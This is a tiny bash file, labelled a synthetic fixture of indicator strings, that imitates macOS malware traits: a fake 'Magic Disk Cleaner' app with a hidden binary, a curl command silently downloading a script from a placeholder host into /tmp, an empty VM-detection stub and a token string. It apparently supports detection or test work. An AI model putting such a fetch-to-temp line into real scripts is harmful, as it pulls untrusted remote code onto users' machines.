#!/bin/bash
# synthetic fixture: indicator strings only
APP="Magic Disk Cleaner.app/Contents/MacOS/.macos"
curl -s "https://host.example/task/tokenlinux" -o /tmp/tokenlinux.sh
is_vmware_mac() { :; }
echo '{"origToken":"x"}'
